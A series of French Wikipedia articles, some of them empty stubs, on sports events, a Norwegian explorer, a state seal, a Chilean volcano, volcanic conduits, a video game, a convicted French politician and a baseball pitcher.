À l'issue de la saison, le champion s'est qualifié pour le de qualification de la Ligue des champions 2007-2008.
Le vainqueur de la Crnogorski Fudbalski Kup a pris la première place en Coupe UEFA 2007-2008. L'autre place en Coupe UEFA est revenue au deuxième du championnat.
Enfin le troisième du championnat s'est qualifié pour la Coupe Intertoto 2007.
Compétition.
Classement.
Le classement est établi sur le barème de points classique (victoire à 3 points, match nul à 1, défaite à 0).
Pour départager les égalités, on tient d'abord compte de la différence de buts générale, puis du nombre de buts marqués, puis des confrontations directes et enfin si la qualification ou la relégation est en jeu, les deux équipes jouent une rencontre d'appui sur terrain neutre.
Barrages.
Les deux avant-derniers du championnat, le FK Dečić Tuzi et le Jedinstvo Bijelo Polje ont affronté le et le FK Bokelj Kotor pour rester en Prva Crnogoska Liga.

</doc>
<doc id="2844508" url="https://fr.wikipedia.org/wiki?curid=2844508" title="Tryggve Gran">
Tryggve Gran

Jens Tryggve Herman Gran ( - ) est un explorateur, aviateur et auteur norvégien.
Biographie.
Né à Bergen (Norvège), il grandit dans une famille aisée qui tient une place importante dans l'industrie de la construction navale. Son père meurt quand Tryggve a cinq ans. En 1900, il est envoyé dans une école en Suisse pendant un an, où il apprend un peu d'allemand et de français. Trois ans plus tard, il rencontre l'empereur allemand, Guillaume II, souvent invité chez l'entourage de la famille de Tryggve. Cette rencontre à l'âge de 14 ans le décide à devenir officier naval plus tard. Il avait déjà passé plusieurs années dans le bataillon Nygaards des buekorps (une organisation de jeunes de Bergen).
Il est un footballeur doué, jouant dans l'équipe nationale norvégienne en 1908.
Il s'intéresse à la science et à l'exploration dans les années suivantes, ce qui le mène, en 1910, à sa recommandation par Fridtjof Nansen à Robert Falcon Scott. Ce dernier se trouvait en Norvège préparant son expédition en Antarctique (l'expédition Terra Nova) et cherchant de nouveaux hommes pour le voyage. Scott, impressionné, prend Gran (très bon skieur) dans son équipe. Il fera partie plus tard du groupe qui découvrit le cadavre de Scott, et ses skis seront utilisés pour former une croix au-dessus de sa tombe. Il se voit décerner la médaille polaire par George V.
Pendant le voyage de retour, Gran rencontre l'aviateur irlandais Robert Lorrain et commence à s'intéresser à l'aviation. Il devient un pilote accompli à l'école d'aviation de Louis Blériot à Paris, et le , il devient le premier à survoler la mer du Nord. Il décolle à bord d'un Blériot XI, de la baie de Cruden (Écosse) et arrive à Jæren en Norvège 4 heures et demie plus tard.
Cinq jours après, le Royaume-Uni s'engage dans la Première Guerre mondiale. Gran, alors premier lieutenant dans les forces aériennes de la Norvège, se porte volontaire à la Royal Air Force. Il est rejeté à cause de la neutralité déclarée de son pays natal. Pourtant, cela ne l'arrête pas ; il est admis dans la RAF sous le pseudonyme de « Captain Teddy Grant » du Canada. Il sert la RAF à Londres, sur le front de l'Ouest et à Arkhangelsk. Gran dit avoir abattu l'avion du célèbre pilote allemand Hermann Göring le 8 ou , ce qu'il ne découvre que plusieurs années après la guerre, en rencontrant Göring et en comparant leurs livres de bord. Pendant la guerre, il est promu au grade de major dans la RAF ; on lui décerne la croix militaire pour service distingué en temps de guerre.
Après la guerre, Gran commence à faire des conférences sur l'aviation et sur ses voyages en Antarctique et écrit plusieurs livres. En 1928, il fait partie d'une équipe de recherche pour trouver Roald Amundsen, dont l'avion s'était écrasé.
Pendant la Seconde Guerre mondiale, il est proche de la "Nasjonal Samling" (le parti nationaliste de Vidkun Quisling). Le parti utilise son statut de héros national pour la propagande de guerre, et en 1944 on sort un timbre pour célébrer le de son vol au-dessus de la mer du Nord. Certains disent que Gran craignait des représailles de la part du parti nationaliste dû à son service dans la RAF lors de la Première Guerre mondiale, et d'autres que son amitié avec Göring et son amertume dû au refus des forces aériennes de la Norvège de lui offrir un poste à temps plein sont les raisons derrière son appui à la "Nasjonal Samling". Il est reconnu coupable de trahison en 1948 et condamné à 18 mois de prison.
Il meurt à Grimstad (Norvège) le , quelques jours avant son .

</doc>
<doc id="2844509" url="https://fr.wikipedia.org/wiki?curid=2844509" title="Velimir Radinovic">
Velimir Radinovic

Velimir Radinovic, né le à Toronto (Canada), est un joueur de basket-ball professionnel Serbo-Canadien. Il mesure 2,12 m.

</doc>
<doc id="2844514" url="https://fr.wikipedia.org/wiki?curid=2844514" title="Sceau de la Virginie-Occidentale">
Sceau de la Virginie-Occidentale

Le sceau de l'État de Virginie-Occidentale a été adopté en 1863.
Le centre du sceau contient un rocher dans lequel est inscrit , date à laquelle la Virginie-Occidentale devint un état. Devant le rocher, on peut voir deux fusils entrecroisés surmontés d'un bonnet phrygien pour montrer l'importance de l'État dans la lutte pour la liberté. Les deux hommes de chaque côté du rocher représentent l'agriculture et l'industrie. Sur le côté gauche il y a un fermier avec une hache et une charrue avant une moisson. De l'autre côté il y a un mineur avec une pioche et derrière lui un marteau et une enclume. La bordure extérieure contient le texte "État de Virginie Occidentale" et la devise de l'état "Montani Semper Liberi", ("les Montagnards sont Toujours Libres "). Le surnom de l'État est "The Mountain State".

</doc>
<doc id="2844517" url="https://fr.wikipedia.org/wiki?curid=2844517" title="Köchel">
Köchel

Cette page contient les pages d'homonymie de Köchel et Köchl.

</doc>
<doc id="2844519" url="https://fr.wikipedia.org/wiki?curid=2844519" title="Koechel">
Koechel



</doc>
<doc id="2844520" url="https://fr.wikipedia.org/wiki?curid=2844520" title="Daïra de Batna">
Daïra de Batna

La daïra de Batna est une daïra d'Algérie située dans la wilaya de Batna et dont le chef-lieu est la ville éponyme de Batna.
Localisation.
La daïra est située au centre de la wilaya de Batna.
Communes.
La daïra est composéé de deux communes : Fesdis, Batna et Oued Chaaba.

</doc>
<doc id="2844526" url="https://fr.wikipedia.org/wiki?curid=2844526" title="Chantal Mace">
Chantal Mace



</doc>
<doc id="2844528" url="https://fr.wikipedia.org/wiki?curid=2844528" title="District de Haga">
District de Haga

Le est un district de la préfecture de Tochigi, au Japon.
Géographie.
Démographie.
Le , le district de Haga comptait répartis sur une superficie de (densité de population de ).
Municipalités du district.
Le district de Haga est composé de quatre bourgs :

</doc>
<doc id="2844537" url="https://fr.wikipedia.org/wiki?curid=2844537" title="Hell's Bells">
Hell's Bells



</doc>
<doc id="2844539" url="https://fr.wikipedia.org/wiki?curid=2844539" title="Algarve Cup 2008">
Algarve Cup 2008

L'Algarve Cup 2008 est la quinzième édition de l'Algarve Cup, compétition internationale de football féminin qui se déroule chaque année dans la ville portugaise. Le tournoi, qui a eu lieu du 5 mars au , a été remportée par les États-Unis pour la sixième fois en battant comme l'année précédente le Danemark en finale.
Format.
Les douze équipes invitées sont divisées en 3 groupes. Les groupes sont identiques à ceux de l'édition précédente hormis la présence de l'Italie qui remplace la France dans le groupe B. La Pologne participe pour la première fois à cette compétition. 
Les groupes A et B sont composées des meilleurs sélections. Ainsi les premières de ces deux groupes accèdent directement à la finale alors que les seconds se disputent la troisième place de la compétition et les cinquième des groupes A et B, la cinquième place.
Les équipes du groupe C jouent pour les places 7 à 12, le premier de ce groupe affrontent alors le quatrième du groupe A pour la septième place et le second du groupe C disputent la neuvième place du tournoi au dernier du groupe B. 

</doc>
<doc id="2844540" url="https://fr.wikipedia.org/wiki?curid=2844540" title="The Skeleton Dance">
The Skeleton Dance



</doc>
<doc id="2844543" url="https://fr.wikipedia.org/wiki?curid=2844543" title="Marc Dumoulin">
Marc Dumoulin

Marc Dumoulin, né le à Sainte-Marie-aux-Mines (Haut-Rhin) est un homme politique français, condamné en 2002 pour crime sexuel.
Biographie.
Famille.
Marc Philippe Dumoulin est né le à Sainte-Marie-aux-Mines (Haut-Rhin), ses deux parents sont commerçants.
Il est le père d'un garçon, né de sa première union et s'est remarié en secondes noces en .
Formation.
Il est maître ès sciences économiques de l'université Louis-Pasteur de Strasbourg.
Carrière professionnelle dans le tourisme.
Il débute à la Chambre de commerce et d'industrie de Colmar et du Centre-Alsace, avant de présider l'office du tourisme de la vallée de Sainte-Marie-aux-Mines. Il est ensuite directeur général de la Maison de l'Alsace à Paris (1979-1997). En 1994, il est nommé président de la Fédération nationale des offices de tourisme et syndicats d'initiative (FNOTSI).
Carrière politique.
Le , il est élu député de la deuxième circonscription du Haut-Rhin à Ribeauvillé sous l'étiquette RPR mais siège en tant qu'indépendant à partir de décembre 1998 à la suite d'une mise en accusation judiciaire.
Plainte et condamnation pour viol.
En 1998, Marc Dumoulin est sujet d'une plainte pour viol de la part de sa nièce. Les faits datent d', lorsque la victime, alors âgée de 12 ans et demi, était en vacances chez son oncle et parrain. Elle l'accuse d'avoir commis sur elle des actes de pénétration sexuelle digitales. Marc Dumoulin nie avoir commis de tels actes, et reconnait des « caresses » sur sa nièce et des attouchements sur son propre fils.
Le , il est condamné à cinq ans de prison dont trois ans ferme, mais il fait appel. Le , le bureau de l'Assemblée nationale lève l'immunité parlementaire de Marc Dumoulin, permettant son incarcération. Le , Marc Dumoulin est condamné en appel par la cour d'appel de Metz, à huit ans d'emprisonnement ferme et cinq ans de privation de droits civiques. Cet arrêt est confirmé par la Cour de cassation en .
Distinction.
Marc Dumoulin est nommé chevalier de l'ordre national du Mérite en 1990.

</doc>
<doc id="2844551" url="https://fr.wikipedia.org/wiki?curid=2844551" title="Rampart">
Rampart

Rampart est un jeu vidéo de stratégie développé et édité par Atari Games, sorti en 1990 sur borne d'arcade. Il a été adapté sur divers supports familiaux : micro-ordinateurs (Amiga, Atari ST, Commodore 64, DOS) et consoles (Master System, Mega Drive, NES, Super Nintendo, Lynx et Game Boy).
Midway Games a réédité le jeu sur Game Boy Color (1999), sur GameCube, PlayStation 2, PlayStation Portable, Windows et Xbox via les compilations "Midway Arcade Treasures" (2003), sur Game Boy Advance en pack avec "Gauntlet" (2005) et sur PlayStation 3 via le PlayStation Network (2007). Cette derrière version implémente un mode de jeu en ligne jouable à trois.
Le but du joueur est de détruire les ennemis qui attaquent sa forteresse. Il s'agit d'un précurseur du genre du "tower defense".
Système de jeu.
Au début de la partie, chaque joueur choisit un territoire et un des châteaux du territoire.
En mode solo, le joueur doit garder le contrôle de son territoire assailli par des flottes adverses, qui tirent sur le château et tentent de débarquer des fantassins sur la terre ferme ; à chaque manche, il acquiert des points de victoire qui lui permettent de conquérir les territoires successifs sur lesquels il progresse.
En mode multijoueur, le but d'un joueur est d'éliminer ses adversaires en détruisant leurs châteaux ; à chaque manche, les joueurs acquièrent des points de victoire ; le vainqueur est celui qui détruit tous ses adversaires ou, si plusieurs survivent jusqu'à la fin de la dernière manche, celui qui possède le plus de points de victoire.
La partie se déroule en une série de manches, chaque manche étant composée des phases suivantes :

</doc>
<doc id="2844553" url="https://fr.wikipedia.org/wiki?curid=2844553" title="Melimoyu">
Melimoyu

Le Melimoyu, également appelé Melimoto ou encore Melimoya, en espagnol "Cerro Melimoyu" ou "Monte Melimoyu", est un volcan du Chili situé dans la cordillère des Andes.
Géographie.
Le Melimoyu est situé dans le sud du Chili et de la cordillère des Andes, dans la région d'Aysén, à une quarantaine de kilomètres au nord-ouest de la ville de Puyuhuapi.
Culminant à d'altitude, ce stratovolcan étiré sur dix kilomètres dans le sens est-ouest est couronné par un cratère d'un kilomètre de diamètre lui-même inclus dans une caldeira de huit kilomètres de diamètre. Cette dernière présente une brèche au nord-est par laquelle s'échappe le glacier qui recouvre le sommet du volcan. Construit par des laves basaltiques et andésitiques, la montagne présente de nombreux cônes de cendres à sa surface.
Histoire éruptive.
Seules deux éruptions du Melimoyu sont connues : une en 850 et la dernière en 200. Elles ont toutes les deux eu un caractère explosif. Une augmentation de l'activité sismique du volcan depuis juin 2010 laisse penser à une possible reprise d'activité de la part du Melimoyu.

</doc>
<doc id="2844562" url="https://fr.wikipedia.org/wiki?curid=2844562" title="Water-polo aux Jeux olympiques d'été de 1972">
Water-polo aux Jeux olympiques d'été de 1972

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1972 à Munich.
Équipes.
Équipe d'URSS.
Anatoli Akimov, Oleksiy Barkalov, Vadim Gulyayev, Aleksandr Dolgushin, Aleksandr Dreval, Vladimir Zhmudski, Aleksandr Kabanov, Leonid Osipov, Viacheslav Sobchenko, Nikolay Melnikov, Aleksandr Shidlovskiy.
Équipe de Hongrie.
András Bodnár, Tibor Cservenyák, István Görgényi, Tamás Faragó, Zoltán Kásás, Dr. Ferenc Konrád, István Magas, Dénes Pócsik, László Sárosi (water-polo), Endre Molnár, István Szivós.
Équipe des États-Unis.
Peter Asch, Steven Barnett, Bruce Bradley, Stanley Cole, James Ferguson, Eric Lindroth, John Parker, Gary Sheerer, James Sletton, Russell Webb, Barry Weitzenberg.

</doc>
<doc id="2844566" url="https://fr.wikipedia.org/wiki?curid=2844566" title="Demba Mbengue">
Demba Mbengue

Demba Mbengue, né le à Dakar (Sénégal), est un joueur de basket-ball professionnel français. Il mesure .

</doc>
<doc id="2844570" url="https://fr.wikipedia.org/wiki?curid=2844570" title="Water polo aux jeux Olympiques d'été de 1972">
Water polo aux jeux Olympiques d'été de 1972



</doc>
<doc id="2844577" url="https://fr.wikipedia.org/wiki?curid=2844577" title="Ranger X">
Ranger X

Ranger X, appelé Ex-Ranza au Japon, est un jeu vidéo d'action développé par GAU Entertainment et édité par Sega, sorti en 1993 sur Mega Drive.

</doc>
<doc id="2844579" url="https://fr.wikipedia.org/wiki?curid=2844579" title="Histoire philatélique et postale de l'Empire ottoman">
Histoire philatélique et postale de l'Empire ottoman

Ceci est une introduction à l'histoire postale et philatélique de l'Empire ottoman.
Les timbres de l'Empire ottoman.
Les premiers timbres provenant de l'Empire ottoman ont été émis en 1858. Il s'agissait en fait d'affranchir les lettres confiées aux bateaux de l'Amirauté. En 1868, deux timbres d'usage identique ont été émis pour la compagnie « Asia Minor Steam Ship Co ».
Les « vrais timbres » datent en fait de 1863 et ont été utilisés dans de nombreux pays sous dépendance ottomane :
Bureaux du Levant.
Bureaux autrichiens.
Il y a eu jusqu'à 80 bureaux ouverts. Ils utilisèrent les timbres de la Lombardie-Vénétie partir de 1863, puis des émissions spécifiques (en Soldi) à partir de .
Pour une vue exhaustive, voir la galerie https://commons.wikimedia.org/wiki/Postmarks_of_Austrian_post_offices_abroad

</doc>
<doc id="2844582" url="https://fr.wikipedia.org/wiki?curid=2844582" title="Benoît Gillet">
Benoît Gillet

Benoit Gillet, né le à Auxerre, est un joueur de basket-ball professionnel français. Il mesure .
Biographie.
Benoît Gillet a été formé au pôle espoir de Dijon où il a joué plusieurs années en championnat de France cadets.
Il commence sa carrière professionnelle à Reims où il joue en première division.
Il joue ensuite à Clermont-Ferrand, passe une année au club de Saint-Étienne, puis rejoint Lille.
Au total, il dispute 124 matchs en Pro A.
Au cours de sa carrière, il est également sélectionné en équipe de France des moins de 20 ans, équipe avec laquelle il dispute le Championnat d'Europe en Turquie durant l'été 2006. Il fait partie des pré-sélections pour les Championnats d'Europe de l'année précédente mais il n'est pas retenu.
En 2014, il signe evec le cub de Denain (Pro B) où il évolue pendant trois saisons.
En 2017, il rejoint le club de Saint-Quentin, club avec lequel il signe à nouveau pour une consécutive en juin 2022.
En 2023, à 36 ans, il signe pour deux saisons avec le club Denain (Pro B), club avec lequel il a déjà joué entre 2014 et 2017 .

</doc>
<doc id="2844584" url="https://fr.wikipedia.org/wiki?curid=2844584" title="Joe Gallagher">
Joe Gallagher



</doc>
<doc id="2844585" url="https://fr.wikipedia.org/wiki?curid=2844585" title="Water-polo aux Jeux olympiques d'été de 1968">
Water-polo aux Jeux olympiques d'été de 1968

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1968 à Mexico.
Équipes.
Équipe de Yougoslavie.
Ozren Bonačić, Dejan Dabovic, Zdravko Hebel, Zoran Janković, Ronald Lopatny, Uros Marovic, Mirko Sandic, Dorde Perisic, Miroslav Poljak, Karlo Stipanic, Ivo Trumbić.
Équipe d'URSS.
Oleksiy Barkalov, Oleg Bovin, Aleksandr Dolgushin, Leonid Osipov, Yuri Grigorovski, Boris Grishin, Vadim Gulyayev, Vladimir Semionov, Alexandr Shidlovski, Viacheslav Skok, Givi Chikvanaya.
Équipe de Hongrie.
András Bodnár, Zoltán Dömötör, László Felkai, Ferenc Konrád, János Konrád, Mihály Mayer, Lászlo Sárosi, János Steinmetz, Endre Molnár, Dénes Pócsik, István Szivós.

</doc>
<doc id="2844593" url="https://fr.wikipedia.org/wiki?curid=2844593" title="Water-polo aux Jeux olympiques d'été de 1964">
Water-polo aux Jeux olympiques d'été de 1964

Cet article présente les résultats et d'autres informations concernant la compétition de water-polo aux Jeux olympiques d'été de 1964 à Tokyo.
Lieux de la compétition.
Tous les matches de la compétition ont lieu dans la piscine métropolitaine couverte de Tokyo, située dans le quartier de Sendagaya, arrondissement de Shibuya. Cette installation pouvait alors accueillir spectateurs. Construite spécialement pour les troisièmes Jeux Asiatiques, elle dispose d'un bassin de de long et de large, et peut accueillir 9 couloirs. Elle comprend aussi un bassin de plongeon de 25 x , avec un tremplin de .
Les trois installations sportives suivantes sont mises à disposition des équipes pour leur entraînement :
Les deux premières étaient équipées de bassins de ; la dernière d'un bassin de .
Équipes qualifiées.
Le Japon est qualifié en tant que pays organisateur
Six équipes sont qualifiées automatiquement en raison de leur classement aux Jeux olympiques d'été de 1960 à Rome:
Trois équipes sont qualifiées d'après leur classement au championnat d'Europe de 1962 :
Trois équipes sont qualifiées d'après leur classement aux Jeux panaméricains de 1963 :
Une équipe est qualifiée d'après son classement aux Jeux eurasiatiques (?) :
Deux équipes sont qualifiées d'après leur classement au championnat africain :
Équipes participant à la compétition.
La Suède et l'Argentine ne participeront pas et l'Afrique du Sud n'a pas été invitée.
Treize équipes disputent finalement la compétition :
Équipe unifiée d'Allemagne.
Siegfried Ballerstedt, Hubert Hohne, Jürgen Kluge, Heinz Mader, Klaus Schlenkrich, Peter Schmidt, Klaus Schulze, Jürgen Thiel, Edgar Thiele, Dieter Vohs, Heinz, Wiitig.
Équipe d'Australie.
Nicol Barnes, Stanley R. A. Hammond, Thomas Henry Hoad, William Anthony McAtee, Ian Alexander Mills, Lelsie Ernest Nunn, Edward John Pierce, William J. B. Phillips, Graeme Leslie Samuel, Lean Albert Wiegard, Michael Rodney Withers.
Équipe de Belgique.
Jacques Cautrier, Frank D'Oosterlinck, Bruno De Hosselle, Karel De Vis, Roger De Wilde, José Dumont, André Laurent, Léon Pickers, Joseph Stappers, Johan Van Den Steen, Eric Van Reybroecke.
Équipe du Brésil.
Ney Borges Nogueira, Oswaldo Chochrane Filho, Daniel Luiz, João Goncalves Filho, Adhemar Grijó Fiilho, Marvio Kelly Dos Santos, Ivo Kesselring Carotini, Paulo Kesselring Carotini, Pedro Pinciroli Junior, Rodney Stuart Bell, Aladar Szabo
Équipe d'Égypte.
Amin Abdelrahman, Mamadouh Amir, Hussein El-Gamal, Adel El-Moalemn Sami El-Sayed, Goubran Farag, Ashraf Gamil, Mohammed Khalil, Hazem Kourched, Mohalled Abid Soliman.
Équipe des États-Unis.
David Ashley, Stanley Cole, Ronald Crawford, Daniel Drown, Charles McIlroy, Ned McIlroy, Paul McIlroy, Robert Saari, George Stransky, Anton Van Dorp, Ralph Whitney.
Équipe de Hongrie.
Miklós Ambrus, László Felkai, János Konrád, Zoltán Dömötör, Tivadar Kanizsa, Péter Rusorán, György Kárpáti, Mihály Mayer, Dezső Gyarmati, Denes Pocsik, Ottó Boros.
Équipe d'Italie.
Danio Bardi, Mario Cevasco, Giuseppe D'Altrui, Federico Dennerlein, Giancarlo Guerrini, Franco Lavatori, Gianni Lonzi, Eugeno Merello, Rosario Parmegiani, Eraldo Pizzo, Dante Rossi, Alberto Spinola.
Équipe du Japon.
Reizo Aoyama, Hachiro Arakawa, Shigenobu Fujimoto, Norihide Iida, Mineo Kato, Shigeharu Kuwabara, Keisuke Satsuki, Yoji Shimizu, Koki Takagi, Kazuya Takeuchi, Takashi Yokoyama.
Équipe des Pays-Bas.
Jan Bultman, Hendrik Hermsen, Lambertus Lniest, Abraham Leenards, Johan Muller, Nicolaas van der Voet, Alfred van Dorp, Willem van Spingelen, Henri Vriend, Willem Vriend, Gerardius Wormgoor.
Équipe de l'Union soviétique.
Igor Grabovski, Vladimir Kuznetsov, Boris Grishin, Boris Popov, Nikolay Kalashnikov, Zenon Bortkevich, Nikolay Kuznetsov, Vladimir Semionov, Viktor Ageyev, Leonid Osipov, Eduard Yegorov.
Équipe de Yougoslavie.
Milan Muškatirović, Ivo Trumbić, Vinko Rosić, Zlatko Šimenc, Bozidar Stanisic, Ante Nardelli, Zoran Janković (water-polo), Mirko Sandic, Frane Nonkovic, Ozren Bonacic, Karlo Stipanic.
Déroulement de la compétition.
Tour préliminaire.
Les douze équipes qualifiées sont réparties en quatre poules de quatre équipes chacune. Trois équipes étant absentes (Afrique du Sud, Argentine, Suède), trois poules sont en fait composées de trois équipes. Au sein de chaque poule, toutes les équipes se rencontrent. Deux points sont attribués pour une victoire, un pour un match nul, et aucun pour une défaite. Les deux premières équipes de chaque poule sont qualifiées pour les demi-finales, les autres sont éliminées de la compétition.
Demi-finales.
Les huit équipes qualifiées sont regroupées en 2 mini-championnats. Le premier regroupe les équipes qualifiées dans les groupes A et B ; la seconde celles des groupes C et D. Au sein de chaque mini-championnat, toutes les équipes se rencontrent, sauf celles qui se sont déjà rencontrées lors du tour préliminaire. Dans ce cas, le résultat du match est repris à l'identique et compte dans le classement.
Une victoire rapporte 2 points, un match nul 1 point, une défaite 0. Les deux meilleures équipes de chaque poule sont qualifiées pour la finale. Les autres disputent les matches de classement.
Demi-finale des groupes A et B.
Dans cette demi finale, les résultats des matches Italie-Roumanie (4-3) et Union soviétique-Allemagne (3-2) sont comptabilisés dans le classement.
Demi-finale des groupes C et D.
Dans cette demi finale, les résultats des matches Yougoslavie-Pays-Bas (7-2) et Hongrie-Belgique (5-0) sont comptabilisés dans le classement.
Finale et matches de classement.
Finale.
Les quatre équipes s'affrontent dans un mini-championnat. Toutes les équipes se rencontrent, sauf celles qui se sont déjà rencontrées lors des demi-finales. Dans ce cas, le résultat du match est repris à l'identique et compte dans le classement.
Une victoire rapporte 2 points, un match nul 1 point, une défaite 0.
Dans la finale, les résultats des matches Italie-Union soviétique (0-2) et Yougoslavie-Hongrie(4-4) sont comptabilisés dans le classement.
Matches de classement.
Les quatre équipes s'affrontent dans un mini-championnat. Toutes les équipes se rencontrent, sauf celles qui se sont déjà rencontrées lors des demi-finales. Dans ce cas, le résultat du match est repris à l'identique et compte dans le classement.
Une victoire rapporte 2 points, un match nul 1 point, une défaite 0.
Dans la finale, les résultats des matches Roumanie-Allemagne (5-4) et Pays-Bas-Belgique (7-5) sont comptabilisés dans le classement.

</doc>
<doc id="2844596" url="https://fr.wikipedia.org/wiki?curid=2844596" title="Water-polo aux Jeux olympiques d'été de 1960">
Water-polo aux Jeux olympiques d'été de 1960

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1960 à Rome.
Équipes.
Équipe d'Italie.
Amedeo Ambron, Danio Bardi, Giuseppe D'Altrui, Salvatore Gionta, Franco Lavoratori, Gianni Lonzi, Luigi Mannelli, Eraldo Pizzo, Rosario Parmegiani, Dante Rossi, Brunello Spinelli, Giancarlo Guerrini, entraîneur : Bandy Zolyomi.
Équipe d'URSS.
Vladimir Semionov, Anatoli Kartashev, Petre Mshvenieradze, Vladimir Novikov, Viktor Ageyev, Givi Chikvanaya, Leri Gogoladze, Yuriy Grigorovskiy, Viacheslav Kurennoi, Boris Goikhman, Evgeni Saltsyn.
Équipe de Hongrie.
Kálmán Markovits László Felkai, András Katona, György Kárpáti, László Jeney, Otto Boros, István Hevesi, Mihály Mayer, Zoltán Dömötör, Dezső Gyarmati, Tivadar Kanizsa, Péter Rusorán.

</doc>
<doc id="2844600" url="https://fr.wikipedia.org/wiki?curid=2844600" title="Alexander Alexandrovitch Alabiev">
Alexander Alexandrovitch Alabiev



</doc>
<doc id="2844605" url="https://fr.wikipedia.org/wiki?curid=2844605" title="Water-polo aux Jeux olympiques d'été de 1956">
Water-polo aux Jeux olympiques d'été de 1956

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1956 à Melbourne.
Équipes.
Équipe de Hongrie.
Ottó Boros, Dezsö Gyarmati, István Hevesi, Antal Bolvari, Kálmán Markovits, László Jeney, Tivadar Kanizsa, Ervin Zádor, Mihály Mayer, György Karpati, István Szivós.
Équipe de Yougoslavie.
Zdravko-Ćiro Kovačić, Ivica Cipci, Tomislav Franjković, Marijan Žužej, Zdravko Ježić, Lovro Radonjić, Hrvoje Kačić, Vladimir Ivković, Juraj Amšel, Ivo Štakula, Boško Vuksanović.
Équipe d'URSS.
Borys Hoykhman, Yuriy Shliapin, Viacheslav Kurennoi, Viktor Ageyev, Nodar Gvakhariya, Piotr Mshvenieradze, Piotr Breus, Mikhail Ryzhak, Valentin Prokopov, Boris Markarov.

</doc>
<doc id="2844608" url="https://fr.wikipedia.org/wiki?curid=2844608" title="Water-polo aux Jeux olympiques d'été de 1952">
Water-polo aux Jeux olympiques d'été de 1952

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1952 à Helsinki.
Équipes.
Équipe de Hongrie.
László Jeney, György Vízvári, Dezső Gyarmati, István Hasznos, György Kárpáti, Róbert Antal, Dezső Fábián, Kálmán Markovits, Károly Szittya, Dezső Lemhényi, Miklós Martin, Antal Bolvári, István Szívós.
Équipe de Yougoslavie.
Zdravko-Ćiro Kovačić, Veljko Bakašun, Ivo Štakula, Zdravko Ježić, Ivo Kurtini, Boško Vuksanović, Lovro Radonjić, Vladimir Ivković, Marko Brainović.
Équipe d'Italie.
Raffaello Gambino, Cesare Rubini, Maurizio Mannelli, Geminio Ognio, Gildo Arena, Renato De Sanzuane, Carlo Peretti, Renato Traiola, Vincenzo Polito, Salvatore Gionta, Lucio Ceccarini.

</doc>
<doc id="2844610" url="https://fr.wikipedia.org/wiki?curid=2844610" title="Cheminée volcanique">
Cheminée volcanique

Une cheminée volcanique est un conduit éruptif créé par l'ascension des magmas d'une chambre magmatique jusqu'à la surface d'un cratère volcanique et par lequel sont émis les produits volcaniques (gaz, laves et projections). Le terme conduit volcanique . Les recherches sur l'étude de la dynamique du magma durant son ascension se multiplient car les processus dans le conduit volcanique gouvernent l'évolution de l'activité éruptive des volcans.
Description.
Le transfert du magma à travers la croûte terrestre se fait par fracturation hydraulique, autrement dit par injection de sills et dykes multiples qui résultent du remplissage de fractures verticales, radiaires ou concentriques à l'édifice volcanique. Ces filons, en général de longueur de 1 à et d'épaisseur de 1 à se propagent dans les roches encaissantes à des vitesses de quelques m/s. Cette propagation par injection de magma suit une direction perpendiculaire à la contrainte compressive minimale, ou bien à la faveur de discontinuités mécaniques comme des failles ou des changements de lithologie. Les filons alimentent ainsi des chambres magmatiques ou les éruptions fissurales en surface parfois associées à des fontaines de lave. Lorsque les éruptions se poursuivent, le magma se refroidit aux épontes des filons, et son écoulement se focalise au niveau d'un dyke d'alimentation qui a évolué en un conduit unique plus ou moins cylindrique, dont l'élargissement est causé soit par l'érosion de la roche hôte, soit par la fracturation. Le conduit .
La dénomination de cheminée est ainsi .
Nulle voie ne préexistant, une cheminée volcanique est soit active, soit bouchée (bouchon lavique au sommet), et correspond à une seule éruption particulière, dont la durée peut être cependant très variable (de quelques instants à de nombreuses années), chaque éruption créant sa propre cheminée.
Une cheminée peut être dégagée des roches qui l'entourent par l'érosion et former ainsi un neck.

</doc>
<doc id="2844614" url="https://fr.wikipedia.org/wiki?curid=2844614" title="Water-polo aux Jeux olympiques d'été de 1948">
Water-polo aux Jeux olympiques d'été de 1948

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1948 à Londres.
Équipes.
Équipe d'Italie.
Pasquale Buonocore, Emilio Bulgarelli, Cesare Rubini, Geminio Ognio, Gildo Arena, Aldo Ghira, Tullio Pandolfini, Mario Majoni, Gianfranco Pandolfini. Entraîneur : Giuseppe Valle.
Équipe de Hongrie.
László Jeney, Miklós Holop, Dezső Gyarmati, Károly Szittya, Oszkár Csuvik, István Szivós, Dezső Lemhényi, Jenő Brandi, Dezső Fabián, Endre Győrfi.
Équipe des Pays-Bas.
Johannes Jacobus Rohner, Cornelis Korevaar, Cornelis Braasem, Hans Stam, Rudolph Frederik Otto van Feggelen, Frits Smol, Albert Frits Ruimschotel, Hendrikus Zacharias Keetelaar, Pieter Johannes Alexander Salomons.

</doc>
<doc id="2844617" url="https://fr.wikipedia.org/wiki?curid=2844617" title="Barry Zito">
Barry Zito

Barry William Zito (né le à Las Vegas, Nevada, États-Unis) est un ancien lanceur gaucher des Athletics d'Oakland et des Giants de San Francisco de la Ligue majeure de baseball. 
Il évolue 7 saisons, de 2000 à 2006, pour les Athletics d'Oakland, qu'il représente 3 fois au match des étoiles (2002, 2003 et 2006) et avec qui il remporte le trophée Cy Young du meilleur lanceur de la Ligue américaine en 2002. 
De 2007 à 2013, il joue chez les Giants de San Francisco, avec qui il remporte les Séries mondiales de 2010 et 2012.
Absent du jeu en 2014, il effectue un dernier tour de piste avec Oakland en 2015 avant de mettre un terme à sa carrière sportive.
Biographie.
Athletics d'Oakland.
Barry Zito est le choix de première ronde (neuvième athlète sélectionné au total) des Athletics d'Oakland en 1999. Lanceur droitier promis à une belle carrière, il fait son entrée dans les majeures un an plus tard, amorçant son premier match dans l'uniforme des Athletics le . Le partant effectue 14 départs à sa saison recrue. Il remporte 7 de ses 11 décisions et affiche une excellente moyenne de points mérités de 2,72. Il est considéré pour le titre de recrue de l'année de la Ligue américaine, mais termine sixième au vote remporté par Kazuhiro Sasaki des Mariners de Seattle. Il participe à l'automne à un premier match de séries éliminatoires et est crédité de la victoire à son seul départ en Série de division contre les Yankees de New York.
